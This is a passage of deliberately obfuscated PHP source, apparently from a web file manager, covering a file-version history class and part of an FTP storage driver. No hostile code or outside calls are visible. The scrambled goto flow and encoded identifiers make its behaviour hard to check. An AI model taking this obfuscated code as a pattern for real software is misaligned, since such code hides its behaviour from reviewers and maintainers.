KodIO::KOD_SHARE_ITEM; goto d·Öš„ˆ“Ğ; A¡“àáÑ”: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $cÄã¨±ø = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $aÇÂõ÷§õâ[1156]); foreach ($cÄã¨±ø as $CøÆ„•¨ˆ¿) { if (!$A÷ô¤íÕƒ• && substr($bÇ‰´°½¸, 0, strlen($CøÆ„•¨ˆ¿)) == $CøÆ„•¨ˆ¿) { return !1; } } goto eë÷©Úµƒ; d·Öš„ˆ“Ğ: if (!$d±·öšôİÏ || !$BƒáÄŸŠõÒ[$aÇÂõ÷§õâ[1154]]) { return !1; } if (substr($bÇ‰´°½¸, 0, strlen(DATA_PATH . $aÇÂõ÷§õâ[1155])) == DATA_PATH . $aÇÂõ÷§õâ[1155]) { return !1; } if ($A÷ô¤íÕƒ• == KodIO::KOD_SHARE_ITEM) { $f´—Ì…“´ = IO::init($bÇ‰´°½¸); if ($f´—Ì…“´->pathParse[$aÇÂõ÷§õâ[1082]]) { return self::parsePath($f´—Ì…“´->pathParse[$aÇÂõ÷§õâ[1082]]); } return !1; } goto A¡“àáÑ”; eë÷©Úµƒ: self::log($GLOBALS[$aÇÂõ÷§õâ[1077]] . $aÇÂõ÷§õâ[1157] . $bÇ‰´°½¸); return $bÇ‰´°½¸; goto d¤£¼ÑŠ±; DÀ¡§‰†òÊ: $aÇÂõ÷§õâ =& $_SERVER[Ö‘Øù]; if (!$bÇ‰´°½¸) { return !1; } if ($GLOBALS[$aÇÂõ÷§õâ[1153]]) { return; } goto b×ŠÉ±êÏÌ; d¤£¼ÑŠ±: } private static function pathHistory($fáºÀÜëÎ) { $a‡‚ø¯Ú¯ =& $_SERVER[Ö‘Øù]; $DÉº¢•¾ã = self::$_historyBase . ltrim(KodIO::clear($fáºÀÜëÎ), $a‡‚ø¯Ú¯[8]); $DÉº¢•¾ã = str_replace(array($a‡‚ø¯Ú¯[1158]), array($a‡‚ø¯Ú¯[1159]), $DÉº¢•¾ã); return $DÉº¢•¾ã; } public static function log($C ÀÅŞÎÕá) { } public static function historyCount($d×Ëªª±’‰) { $d• —œ‹ =& $_SERVER[Ö‘Øù]; $BÁµ«›œ³Ú = array(); $a™ß—×ğ¦ = array(); foreach ($d×Ëªª±’‰ as $fÚé¬§ä¥º) { $aÓ©åÎ…ß = get_path_father($fÚé¬§ä¥º); if (!$a™ß—×ğ¦[$aÓ©åÎ…ß]) { $a™ß—×ğ¦[$aÓ©åÎ…ß] = array(); } $a™ß—×ğ¦[$aÓ©åÎ…ß][] = get_path_this($fÚé¬§ä¥º); } foreach ($a™ß—×ğ¦ as $aÓ©åÎ…ß => $CïïßÑ¸ï¡) { $Fœ°˜‚õìÄ = self::parsePath($aÓ©åÎ…ß); if (!$Fœ°˜‚õìÄ) { continue; } foreach ($CïïßÑ¸ï¡ as $dÎ™±”Ğõ²) { $e«”ºëÆ°Ô = self::listData(rtrim($Fœ°˜‚õìÄ, $d• —œ‹[8]) . $d• —œ‹[8] . $dÎ™±”Ğõ², !1); if ($e«”ºëÆ°Ô && $e«”ºëÆ°Ô[$d• —œ‹[367]]) { $BÁµ«›œ³Ú[rtrim($aÓ©åÎ…ß, $d• —œ‹[8]) . $d• —œ‹[8] . $dÎ™±”Ğõ²] = count($e«”ºëÆ°Ô[$d• —œ‹[367]]); } } } return $BÁµ«›œ³Ú; } public static function add($Fâ‡¬¥÷ÏÖ) { goto B†âğ¢¼İŠ; bÛ¦‘İíâ¤: $d·ƒ¡÷º¯À = Model($DÕ×Ì¿œÅè[763])->get($DÕ×Ì¿œÅè[1160]); $aâíÇŒöÛï = $GLOBALS[$DÕ×Ì¿œÅè[6]][$DÕ×Ì¿œÅè[88]][$DÕ×Ì¿œÅè[1138]]; $d­…ôŠ§ = $d·ƒ¡÷º¯À == $DÕ×Ì¿œÅè[1161] ? 5 : $aâíÇŒöÛï; goto f¥Ñ¼Œäµ–; E‡‹ßœèÚ¥: $fˆ£¾½¼îÉ = array($DÕ×Ì¿œÅè[395] => $b¯ô—ò, $DÕ×Ì¿œÅè[171] => $BĞ¾“ó±å›, $DÕ×Ì¿œÅè[28] => $c·³íòìÀ¤[$DÕ×Ì¿œÅè[28]] . $DÕ×Ì¿œÅè[95] . date($DÕ×Ì¿œÅè[1162]) . rand_string(1), $DÕ×Ì¿œÅè[78] => $c·³íòìÀ¤[$DÕ×Ì¿œÅè[78]], $DÕ×Ì¿œÅè[447] => USER_ID, $DÕ×Ì¿œÅè[194] => time(), $DÕ×Ì¿œÅè[1163] => $DÕ×Ì¿œÅè[33]); IO::mkdir($FòâáŸáîô[$DÕ×Ì¿œÅè[1164]]); $dŒ‡¥±‡’ = IO::copy($Fâ‡¬¥÷ÏÖ, $FòâáŸáîô[$DÕ×Ì¿œÅè[1164]], !1, $fˆ£¾½¼îÉ[$DÕ×Ì¿œÅè[28]]); goto D¢Ê©‰ì¾; B†âğ¢¼İŠ: $DÕ×Ì¿œÅè =& $_SERVER[Ö‘Øù]; $FòâáŸáîô = self::listData($Fâ‡¬¥÷ÏÖ); if (!$FòâáŸáîô) { return; } goto bÛ¦‘İíâ¤; e¹Æ°Åš›¼: $D“ô¸øæ… = $FòâáŸáîô[$DÕ×Ì¿œÅè[367]]; if ($c·³íòìÀ¤[$DÕ×Ì¿œÅè[78]] == 0) { return; } if ($c·³íòìÀ¤[$DÕ×Ì¿œÅè[78]] >= 1024 * 1024 * 500) { return !1; } goto eïÚ›÷‚Ñ»; eïÚ›÷‚Ñ»: if ($D“ô¸øæ… && $D“ô¸øæ…[0][$DÕ×Ì¿œÅè[171]] == $BĞ¾“ó±å›) { return !0; } if (array_key_exists($DÕ×Ì¿œÅè[196], $c·³íòìÀ¤) && !$c·³íòìÀ¤[$DÕ×Ì¿œÅè[196]]) { return !1; } $b¯ô—ò = short_id(time()); goto E‡‹ßœèÚ¥; f¥Ñ¼Œäµ–: if ($aâíÇŒöÛï <= 0) { return; } $BĞ¾“ó±å› = IO::hashSimple($Fâ‡¬¥÷ÏÖ); $c·³íòìÀ¤ = IO::info($Fâ‡¬¥÷ÏÖ); goto e¹Æ°Åš›¼; Fã‘æ÷»Œ: return self::saveData($FòâáŸáîô[$DÕ×Ì¿œÅè[1165]], $D“ô¸øæ…); goto a¼šğíÊ©è; D¢Ê©‰ì¾: if (!$dŒ‡¥±‡’) { self::clearEmptyFolder($FòâáŸáîô[$DÕ×Ì¿œÅè[1164]]); return !1; } array_unshift($D“ô¸øæ…, $fˆ£¾½¼îÉ); if (count($D“ô¸øæ…) > $d­…ôŠ§) { $b›é«àµäƒ = array_slice($D“ô¸øæ…, $d­…ôŠ§); foreach ($b›é«àµäƒ as $a¦×©„ù´Ú) { IO::remove($FòâáŸáîô[$DÕ×Ì¿œÅè[1164]] . $a¦×©„ù´Ú[$DÕ×Ì¿œÅè[28]]); } $D“ô¸øæ… = array_slice($D“ô¸øæ…, 0, $d­…ôŠ§); } goto Fã‘æ÷»Œ; a¼šğíÊ©è: } public static function remove($aâ…ÍÍ‰ƒ, $C¨çÂ˜»âã) { $CŒøÕ©È¯„ =& $_SERVER[Ö‘Øù]; $bŒ¿ì·Ñö© = self::listData($aâ…ÍÍ‰ƒ); $BÔ©Èñ´Ñ = array(); if (!$bŒ¿ì·Ñö©) { return !1; } foreach ($bŒ¿ì·Ñö©[$CŒøÕ©È¯„[367]] as $D±è» ÙœØ) { if ($D±è» ÙœØ[$CŒøÕ©È¯„[395]] == $C¨çÂ˜»âã) { IO::remove($bŒ¿ì·Ñö©[$CŒøÕ©È¯„[1164]] . $D±è» ÙœØ[$CŒøÕ©È¯„[28]]); continue; } $BÔ©Èñ´Ñ[] = $D±è» ÙœØ; } return self::saveData($bŒ¿ì·Ñö©[$CŒøÕ©È¯„[1165]], $BÔ©Èñ´Ñ); } public static function clear($fĞ¼ê ÷˜Ä, $D¼îííÒ‘ë = true) { $f‹ÄãÂÔùÆ =& $_SERVER[Ö‘Øù]; $E´ÌµŠï£¬ = self::listData($fĞ¼ê ÷˜Ä, $D¼îííÒ‘ë); if (!$E´ÌµŠï£¬) { return !1; } foreach ($E´ÌµŠï£¬[$f‹ÄãÂÔùÆ[367]] as $bÓááËïÔ—) { IO::remove($E´ÌµŠï£¬[$f‹ÄãÂÔùÆ[1164]] . $bÓááËïÔ—[$f‹ÄãÂÔùÆ[28]]); } return self::saveData($E´ÌµŠï£¬[$f‹ÄãÂÔùÆ[1165]], array()); } public static function moveHistory($C½É„óé¥¯, $a»‘ÀÄ³¾ˆ = '', $b¡¢‡ŒŞÍÅ = '') { goto cçİàèÂÁÔ; BÚö¾Õä×®: self::saveData($c–¢Ÿ·“ğ[$FØ©èÓ§ÉÌ[1165]], $c–¢Ÿ·“ğ[$FØ©èÓ§ÉÌ[367]]); self::clearEmptyFolder($c–¢Ÿ·“ğ[$FØ©èÓ§ÉÌ[1164]]); goto a¯÷»¢æÅ´; FÄĞ¶–ã¸»: $EÉ“‰ŸìØ” = $FØ©èÓ§ÉÌ[1152]; $a»‘ÀÄ³¾ˆ = $a»‘ÀÄ³¾ˆ ? $a»‘ÀÄ³¾ˆ : get_path_this($C½É„óé¥¯); $b¡¢‡ŒŞÍÅ = $b¡¢‡ŒŞÍÅ ? $b¡¢‡ŒŞÍÅ : $c–¢Ÿ·“ğ[$FØ©èÓ§ÉÌ[1164]]; goto FÅì¨ãæ‹; FÅì¨ãæ‹: $a©×Â‘«çÊ = substr(get_path_this($c–¢Ÿ·“ğ[$FØ©èÓ§ÉÌ[1165]]), 0, -strlen($EÉ“‰ŸìØ”)); foreach ($c–¢Ÿ·“ğ[$FØ©èÓ§ÉÌ[367]] as $b–çºïè‡ => $cõ´¾ãöªÔ) { $E®¹…ÛĞ»î = $a»‘ÀÄ³¾ˆ . substr($cõ´¾ãöªÔ[$FØ©èÓ§ÉÌ[28]], strlen($a©×Â‘«çÊ)); $FŞ£Ùº¯¾£ = IO::move($c–¢Ÿ·“ğ[$FØ©èÓ§ÉÌ[1164]] . $cõ´¾ãöªÔ[$FØ©èÓ§ÉÌ[28]], $b¡¢‡ŒŞÍÅ, !1, $E®¹…ÛĞ»î); if ($FŞ£Ùº¯¾£) { $c–¢Ÿ·“ğ[$FØ©èÓ§ÉÌ[367]][$b–çºïè‡][$FØ©èÓ§ÉÌ[28]] = $E®¹…ÛĞ»î; } } $c–¢Ÿ·“ğ[$FØ©èÓ§ÉÌ[1165]] = IO::move($c–¢Ÿ·“ğ[$FØ©èÓ§ÉÌ[1165]], $b¡¢‡ŒŞÍÅ, !1, $a»‘ÀÄ³¾ˆ . $EÉ“‰ŸìØ”); goto BÚö¾Õä×®; cçİàèÂÁÔ: $FØ©èÓ§ÉÌ =& $_SERVER[Ö‘Øù]; $c–¢Ÿ·“ğ = self::listData($C½É„óé¥¯, !1); if (!$c–¢Ÿ·“ğ || !$c–¢Ÿ·“ğ[$FØ©èÓ§ÉÌ[367]]) { return !1; } goto FÄĞ¶–ã¸»; a¯÷»¢æÅ´: } public static function rollback($Bƒà¨ó½ª, $AñŸÚÂĞœ) { $d‡—«“Îˆ =& $_SERVER[Ö‘Øù]; $d¨ã¥¢Ğà = self::listData($Bƒà¨ó½ª); if (!$d¨ã¥¢Ğà) { return; } $a¨’Ô‚ µ = IO::info($Bƒà¨ó½ª); foreach ($d¨ã¥¢Ğà[$d‡—«“Îˆ[367]] as $cË‚éçÓÊ¢ => $d•ÉÎĞ¯ÎÚ) { if ($d•ÉÎĞ¯ÎÚ[$d‡—«“Îˆ[395]] == $AñŸÚÂĞœ) { self::add($Bƒà¨ó½ª); $FÖİëÅˆ Ò = $d¨ã¥¢Ğà[$d‡—«“Îˆ[1164]] . $d•ÉÎĞ¯ÎÚ[$d‡—«“Îˆ[28]]; $bµâ‡×¸­ = IO::copy($FÖİëÅˆ Ò, IO::pathFather($Bƒà¨ó½ª), REPEAT_REPLACE, $a¨’Ô‚ µ[$d‡—«“Îˆ[28]]); if ($bµâ‡×¸­) { self::remove($Bƒà¨ó½ª, $AñŸÚÂĞœ); } return $bµâ‡×¸­; } } return !1; } public static function setDetail($F±ô»ƒ¯„, $B®¤¶”ó×, $D¯Ò÷‘±À­) { $FˆáÛ…Æáµ =& $_SERVER[Ö‘Øù]; $CÙ×ÊÛÒ»Ì = self::listData($F±ô»ƒ¯„); if (!$CÙ×ÊÛÒ»Ì) { return; } foreach ($CÙ×ÊÛÒ»Ì[$FˆáÛ…Æáµ[367]] as $fÁ„ÅÌçš¢ => $bò·–Ì²Æ) { if ($bò·–Ì²Æ[$FˆáÛ…Æáµ[395]] == $B®¤¶”ó×) { $CÙ×ÊÛÒ»Ì[$FˆáÛ…Æáµ[367]][$fÁ„ÅÌçš¢][$FˆáÛ…Æáµ[1163]] = $D¯Ò÷‘±À­; self::saveData($CÙ×ÊÛÒ»Ì[$FˆáÛ…Æáµ[1165]], $CÙ×ÊÛÒ»Ì[$FˆáÛ…Æáµ[367]]); return !0; } } return !1; } public static function fileInfo($b†¾ÎìÖŞ, $d†í»½Áç) { goto AÍ„åÚ²Œ†; AÍ„åÚ²Œ†: $AƒéœÕö–Ï =& $_SERVER[Ö‘Øù]; $Aä¾°Ø»ÔÍ = self::listData($b†¾ÎìÖŞ); if (!$Aä¾°Ø»ÔÍ) { show_json(LNG($AƒéœÕö–Ï[105]), !1); } goto f†ÒÜõé¾ô; D ›ÏµšÀ´: return IO::info($F¬öæÍ­“†); goto c“¢Ü¸ÙÀ¢; f†ÒÜõé¾ô: $F¬öæÍ­“† = $AƒéœÕö–Ï[33]; foreach ($Aä¾°Ø»ÔÍ[$AƒéœÕö–Ï[367]] as $d‰âˆ‰“Æê => $BÅŠ’¿ğó) { if ($BÅŠ’¿ğó[$AƒéœÕö–Ï[395]] != $d†í»½Áç) { continue; } $F¬öæÍ­“† = $Aä¾°Ø»ÔÍ[$AƒéœÕö–Ï[1164]] . $BÅŠ’¿ğó[$AƒéœÕö–Ï[28]]; break; } if (!$F¬öæÍ­“†) { show_json(LNG($AƒéœÕö–Ï[105]), !1); } goto D ›ÏµšÀ´; c“¢Ü¸ÙÀ¢: } public static function fileOut($F·¹öô¾Ş, $Dº÷ì¦Î¸Á, $c»Õ¼Á¬¸ = false) { $bÚİä˜´µ» =& $_SERVER[Ö‘Øù]; $AœÃ’†¾í£ = self::fileInfo($F·¹öô¾Ş, $Dº÷ì¦Î¸Á); $Cåà—ˆÓ¾  =& $GLOBALS[$bÚİä˜´µ»[7]]; $c»Õ¼Á¬¸ = isset($Cåà—ˆÓ¾ [$bÚİä˜´µ»[1128]]) && $Cåà—ˆÓ¾ [$bÚİä˜´µ»[1128]] == 1; if (isset($Cåà—ˆÓ¾ [$bÚİä˜´µ»[29]]) && $Cåà—ˆÓ¾ [$bÚİä˜´µ»[29]] == $bÚİä˜´µ»[1166]) { return IO::fileOutImage($AœÃ’†¾í£[$bÚİä˜´µ»[76]], $Cåà—ˆÓ¾ [$bÚİä˜´µ»[1167]]); } IO::fileOut($AœÃ’†¾í£[$bÚİä˜´µ»[76]], $c»Õ¼Á¬¸, get_path_this($F·¹öô¾Ş)); } public static function listData($A¢–ËåàÀ, $B—ÅïïøÉÑ = true) { goto CÂêñÒ”¼ˆ; Eôß‹ñ±İÜ: $eÂåë£ï“ = IO::getContent($cï»÷¤†™ñ[$b‹É©ÓÔÓ½[1165]]); if ($eÂåë£ï“) { $c‰Ğ·…Ó† = json_decode($eÂåë£ï“, !0); if (is_array($c‰Ğ·…Ó†)) { $cï»÷¤†™ñ[$b‹É©ÓÔÓ½[367]] = $c‰Ğ·…Ó†; } } return $cï»÷¤†™ñ; goto E¸¯Á·ãå; CÂêñÒ”¼ˆ: $b‹É©ÓÔÓ½ =& $_SERVER[Ö‘Øù]; if ($B—ÅïïøÉÑ && !IO::exist($A¢–ËåàÀ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto FÄ¤ëƒº”¦; FÄ¤ëƒº”¦: if (substr($A¢–ËåàÀ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $EßŞ¿œœÒ“ = self::pathHistory($A¢–ËåàÀ); $cï»÷¤†™ñ = array($b‹É©ÓÔÓ½[1165] => $EßŞ¿œœÒ“ . $b‹É©ÓÔÓ½[1152], $b‹É©ÓÔÓ½[1164] => rtrim(get_path_father($EßŞ¿œœÒ“), $b‹É©ÓÔÓ½[8]) . $b‹É©ÓÔÓ½[8], $b‹É©ÓÔÓ½[367] => array()); goto Eôß‹ñ±İÜ; E¸¯Á·ãå: } private static function saveData($dÎÃã›óª, $dÄÒå£Ã†á) { goto BŒğĞğ›¤ì; Bº§æËï®‚: $FÅ–¡™ÎÑ = IO::pathFather($dÎÃã›óª); IO::remove($dÎÃã›óª); self::clearEmptyFolder($FÅ–¡™ÎÑ); goto C¤‘ßáŠîø; C¤‘ßáŠîø: return !0; goto aŞŞÁÁºâ¢; BŒğĞğ›¤ì: $Dó‘ÅëÁÈÑ =& $_SERVER[Ö‘Øù]; self::log($Dó‘ÅëÁÈÑ[1168] . $dÎÃã›óª . $Dó‘ÅëÁÈÑ[68] . count($dÄÒå£Ã†á), $Dó‘ÅëÁÈÑ[745]); if ($dÄÒå£Ã†á) { return IO::setContent($dÎÃã›óª, json_encode($dÄÒå£Ã†á)); } goto Bº§æËï®‚; aŞŞÁÁºâ¢: } public static function clearEmptyFolder($eÜ„Àå„ÄÒ) { goto dƒ¹øŠåÂ–; C‚ÔÏÑÈÒ’: $D…ì³³‡¸— = IO::has($eÜ„Àå„ÄÒ, !0); if ($D…ì³³‡¸—[$bã°ìÄ¯„ñ[203]] > 0 || $D…ì³³‡¸—[$bã°ìÄ¯„ñ[204]] > 0) { return; } IO::remove($eÜ„Àå„ÄÒ); goto D½Ó”İÅ´; dƒ¹øŠåÂ–: $bã°ìÄ¯„ñ =& $_SERVER[Ö‘Øù]; if (trim($eÜ„Àå„ÄÒ, $bã°ìÄ¯„ñ[8]) == trim(self::$_historyBase, $bã°ìÄ¯„ñ[8])) { return; } $DÑ¶¾¨Ğ†ä = IO::pathFather($eÜ„Àå„ÄÒ); goto C‚ÔÏÑÈÒ’; D½Ó”İÅ´: self::clearEmptyFolder($DÑ¶¾¨Ğ†ä); goto F¾¾É–íË; F¾¾É–íË: } private static function getBasePath() { goto aƒÍØÂ¹á¼; aƒÍØÂ¹á¼: $a›ª¦Ûø¶Œ =& $_SERVER[Ö‘Øù]; $DÙàÕ’Ú• = Model($a›ª¦Ûø¶Œ[1169])->get($a›ª¦Ûø¶Œ[1170]); if ($DÙàÕ’Ú•) { if (!IO::exist($DÙàÕ’Ú•)) { IO::mkdir($DÙàÕ’Ú•); } if (get_path_this($DÙàÕ’Ú•) == $a›ª¦Ûø¶Œ[1155]) { $D¿ëº¼ùŞ = $a›ª¦Ûø¶Œ[1171] . rand_string(8); @rename($DÙàÕ’Ú•, get_path_father($DÙàÕ’Ú•) . $a›ª¦Ûø¶Œ[8] . $D¿ëº¼ùŞ); $DÙàÕ’Ú• = DATA_PATH . $D¿ëº¼ùŞ . $a›ª¦Ûø¶Œ[8]; file_put_contents(DATA_PATH . $a›ª¦Ûø¶Œ[1172], $a›ª¦Ûø¶Œ[33]); Model($a›ª¦Ûø¶Œ[1169])->set($a›ª¦Ûø¶Œ[1170], $DÙàÕ’Ú•); } return $DÙàÕ’Ú•; } goto D°‰Œë¼®Ê; bÈÉ²»‘Øó: file_put_contents($DÙàÕ’Ú• . $a›ª¦Ûø¶Œ[1172], $a›ª¦Ûø¶Œ[33]); file_put_contents(DATA_PATH . $a›ª¦Ûø¶Œ[1172], $a›ª¦Ûø¶Œ[33]); Model($a›ª¦Ûø¶Œ[1169])->set($a›ª¦Ûø¶Œ[1170], $DÙàÕ’Ú•); goto CÌŠ³íšã; CÌŠ³íšã: return $DÙàÕ’Ú•; goto c ’”Ì—; D°‰Œë¼®Ê: $DÙàÕ’Ú• = DATA_PATH . $a›ª¦Ûø¶Œ[1171] . rand_string(8) . $a›ª¦Ûø¶Œ[8]; $DÙàÕ’Ú• = IO::mkdir($DÙàÕ’Ú•); $DÙàÕ’Ú• = rtrim($DÙàÕ’Ú•, $a›ª¦Ûø¶Œ[8]) . $a›ª¦Ûø¶Œ[8]; goto bÈÉ²»‘Øó; c ’”Ì—: } } goto Aš¨‹Š–¨¤; C¡íˆ«‚‡: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($a¹ËÀ²ç…Ö) { parent::__construct(); if (count($a¹ËÀ²ç…Ö) > 0) { $this->_init($a¹ËÀ²ç…Ö); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($BÜ™»Ö…‰±) { $eÊïŸÒ£è× =& $_SERVER[Ö‘Øù]; global $config; $this->appCharset = $config[$eÊïŸÒ£è×[1276]]; $this->systemCharset = $config[$eÊïŸÒ£è×[1277]]; if (isset($BÜ™»Ö…‰±[$eÊïŸÒ£è×[1278]]) && $BÜ™»Ö…‰±[$eÊïŸÒ£è×[1278]]) { $this->systemCharset = $BÜ™»Ö…‰±[$eÊïŸÒ£è×[1278]]; } } public function iconvApp($cğÆŠ·¢›Ì) { return $this->iconvTo($cğÆŠ·¢›Ì, $this->systemCharset, $this->appCharset); } public function iconvSystem($B¶„ƒÓçÒ‡) { return $this->iconvTo($B¶„ƒÓçÒ‡, $this->appCharset, $this->systemCharset); } public function getPathOuter($cÈÙÀ¬¸È¿) { goto bß¤ï»¯ëÏ; eÛæ¨í÷œõ: $cÈÙÀ¬¸È¿ = KodIO::clear($cÈÙÀ¬¸È¿); $cÈÙÀ¬¸È¿ = substr($cÈÙÀ¬¸È¿, strlen($f´¸‰øÆÒ)); if (empty($this->pathDriver)) { return $cÈÙÀ¬¸È¿; } goto BÇˆ«±®Ï§; FõŠ£õÌÃ: if (substr($f´¸‰øÆÒ, 0, 2) == $BÕœôê˜õÌ[1279]) { $f´¸‰øÆÒ = BASIC_PATH . substr($f´¸‰øÆÒ, 2); } if (substr($cÈÙÀ¬¸È¿, 0, 2) == $BÕœôê˜õÌ[1279]) { $cÈÙÀ¬¸È¿ = BASIC_PATH . substr($cÈÙÀ¬¸È¿, 2); } $f´¸‰øÆÒ = KodIO::clear($f´¸‰øÆÒ); goto eÛæ¨í÷œõ; bß¤ï»¯ëÏ: $BÕœôê˜õÌ =& $_SERVER[Ö‘Øù]; $f´¸‰øÆÒ = $this->iconvApp($this->pathBase); $cÈÙÀ¬¸È¿ = $this->iconvApp($cÈÙÀ¬¸È¿); goto FõŠ£õÌÃ; BÇˆ«±®Ï§: return $this->pathDriver . $BÕœôê˜õÌ[8] . ltrim($cÈÙÀ¬¸È¿, $BÕœôê˜õÌ[8]); goto BÜ¡Ù–©éÊ; BÜ¡Ù–©éÊ: } private function _init($a«©“ëÒİĞ = array()) { $dÂÊĞç»£Š =& $_SERVER[Ö‘Øù]; if (!function_exists($dÂÊĞç»£Š[1280])) { throw new Exception(LNG($dÂÊĞç»£Š[1281])); } $this->config = $a«©“ëÒİĞ; $this->charsetReset($a«©“ëÒİĞ); foreach ($a«©“ëÒİĞ as $BÑ‹à«Ñè => $eã§Ü¤Ï Œ) { if (isset($this->{$BÑ‹à«Ñè})) { $this->{$BÑ‹à«Ñè} = $eã§Ü¤Ï Œ; } } return $this->_login($a«©“ëÒİĞ); } private function _login($e¦Ó›ÈŞ·) { goto CùÄ˜Æ×‹‘; CùÄ˜Æ×‹‘: $aò·ÖÌ‘Ğ÷ =& $_SERVER[Ö‘Øù]; static $bì†ÅÒÍ‹· = array(); $B²’„æõ»õ = md5(json_encode($e¦Ó›ÈŞ·)); goto E‡óÉÅ„™ì; fÓ²œÕñŒ : $bì†ÅÒÍ‹·[$B²’„æõ»õ] = array($aò·ÖÌ‘Ğ÷[1285] => $this->connect, $aò·ÖÌ‘Ğ÷[175] => $this->host, $aò·ÖÌ‘Ğ÷[174] => $this->scheme, $aò·ÖÌ‘Ğ÷[176] => $this->port); return $B·³¦İíµ; goto A¥³ßºËÔ; DªëØ›é×â: $Añ‰¿ùŠ¨ä = isset($D°ŞÅ¹öŠ[$aò·ÖÌ‘Ğ÷[174]]) && $D°ŞÅ¹öŠ[$aò·ÖÌ‘Ğ÷[174]] == $aò·ÖÌ‘Ğ÷[1282] ? !0 : !1; $this->scheme = $Añ‰¿ùŠ¨ä ? $aò·ÖÌ‘Ğ÷[1283] : $aò·ÖÌ‘Ğ÷[1284]; $this->port = isset($D°ŞÅ¹öŠ[$aò·ÖÌ‘Ğ÷[176]]) ? $D°ŞÅ¹öŠ[$aò·ÖÌ‘Ğ÷[176]] : 21; goto Fß©Ì±íÌ¯; a¹‚±ÔÎİ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Bò««õĞ‡˜ = $this->pasv == $aò·ÖÌ‘Ğ÷[87] ? !0 : !1; @ftp_pasv($this->connect, $Bò««õĞ‡˜); goto fÓ²œÕñŒ ; Fß©Ì±íÌ¯: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $B·³¦İíµ = @ftp_login($this->connect, $this->username, $this->userpass); goto a¹‚±ÔÎİ; E‡óÉÅ„™ì: if (isset($bì†ÅÒÍ‹·[$B²’„æõ»õ])) { foreach ($bì†ÅÒÍ‹·[$B²’„æõ»õ] as $F…Ì†ñí…— => $bó‹’‘¾°•) { $this->{$F…Ì†ñí…—} = $bó‹’‘¾°•; } return !0; } $D°ŞÅ¹öŠ = parse_url(trim($this->server, $aò·ÖÌ‘Ğ÷[8])); $this->host = $D°ŞÅ¹öŠ[$aò·ÖÌ‘Ğ÷[175]]; goto DªëØ›é×â; A¥³ßºËÔ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($D÷¯¿÷‚ùè, $C†à“‰º˜„ = '', $dÖ ‰›«ö¼ = REPEAT_RENAME) { if ($this->setContent($D÷¯¿÷‚ùè, $C†à“‰º˜„)) { return $this->getPathOuter($D÷¯¿÷‚ùè); } return !1; } public function mkdir($EãëÙ­í , $eØÏ–ÔÙã = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $EãëÙ­í  = $this->iconvSystem($EãëÙ­í ); if ($this->_isFolder($EãëÙ­í ) || @ftp_mkdir($this->connect, $EãëÙ­í )) { return $this->getPathOuter($EãëÙ­í ); } if (!$this->mkdir($this->pathFather($EãëÙ­í ))) { return !1; } if ($EãëÙ­í  = @ftp_mkdir($this->connect, $EãëÙ­í )) { return $this->getPathOuter($EãëÙ­í ); } return !1; } public function copyFile($bœîÎ›¾àË, $e¢ÑÓÉÜ¦») { goto d™·»ŠÚµÓ; b§¨Îê¦ªØ: $this->tempFileRemve($Aê¯Ôª­Üà); return $aÃ÷ôÁÇöƒ; goto CÎÛƒ™„©¦; C¾¼ÀÛË: $FÚ‡‰š·˜‡ = $this->iconvApp($Aê¯Ôª­Üà); $this->download($bœîÎ›¾àË, $FÚ‡‰š·˜‡); $aÃ÷ôÁÇöƒ = $this->upload($e¢ÑÓÉÜ¦», $FÚ‡‰š·˜‡); goto b§¨Îê¦ªØ; d™·»ŠÚµÓ: if (!$this->_isconn()) { return !1; } $AÆ‹°»¥Ô = $this->pathThis($this->iconvSystem($bœîÎ›¾àË)); $Aê¯Ôª­Üà = $this->tempFile($AÆ‹°»¥Ô); goto C¾¼ÀÛË; CÎÛƒ™„©¦: } public function moveFile($D‰ğÓ±§Õğ, $cÄÅÊœßÑæ) { if (!$this->_isconn()) { return !1; } $D‰ğÓ±§Õğ = $this->iconvSystem($D‰ğÓ±§Õğ); $cÄÅÊœßÑæ = $this->iconvSystem($cÄÅÊœßÑæ); $f·Î‚øºœ = @ftp_rename($this->connect, $D‰ğÓ±§Õğ, $cÄÅÊœßÑæ); return $f·Î‚øºœ ? $this->getPathOuter($cÄÅÊœßÑæ) : !1; } public function delFile($CÅÙÙ‰˜ŠÙ) { if (!$this->_isconn()) { return !1; } $CÅÙÙ‰˜ŠÙ = $this->iconvSystem($CÅÙÙ‰˜ŠÙ); return @ftp_delete($this->connect, $CÅÙÙ‰˜ŠÙ); } public function delFolder($fƒ©ğ¶ˆ¢Š) { goto aå‘ê“…Š; aå‘ê“…Š: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $b»‰«÷«œ = $E¥İÑ¯Ô = array(); goto a£†Ü‚¨Í´; Cõ¨î´ñï: foreach ($b»‰«÷«œ as $DğØĞåšª) { $DğØĞåšª = $this->iconvSystem($DğØĞåšª); $cöÈì°âï = @ftp_rmdir($this->connect, $DğØĞåšª); if (!$cöÈì°âï) { return !1; } } $fƒ©ğ¶ˆ¢Š = $this->iconvSystem($fƒ©ğ¶ˆ¢Š); return @ftp_rmdir($this->connect, $fƒ©ğ¶ˆ¢Š); goto Dó¢”ÇÁÉ¥; a£†Ü‚¨Í´: $this->fileList($fƒ©ğ¶ˆ¢Š, $b»‰«÷«œ, $E¥İÑ¯Ô, !0); $this->listItemCache = !0; foreach ($E¥İÑ¯Ô as $b¦ôİ´ŞÂ) { $DğØĞåšª = $this->iconvSystem($b¦ôİ´ŞÂ[$_SERVER[Ö‘Øù][28]]); $cöÈì°âï = @ftp_delete($this->connect, $DğØĞåšª); if (!$cöÈì°âï) { return !1; } } goto Cõ¨î´ñï; Dó¢”ÇÁÉ¥: } public function rename($D«ø·Œƒ†¢, $Dã—¶‚•¬”) { goto f¿×ÈÄªŸ¡; f¿×ÈÄªŸ¡: $F·¨ˆÊ‰İ³ =& $_SERVER[Ö‘Øù]; if 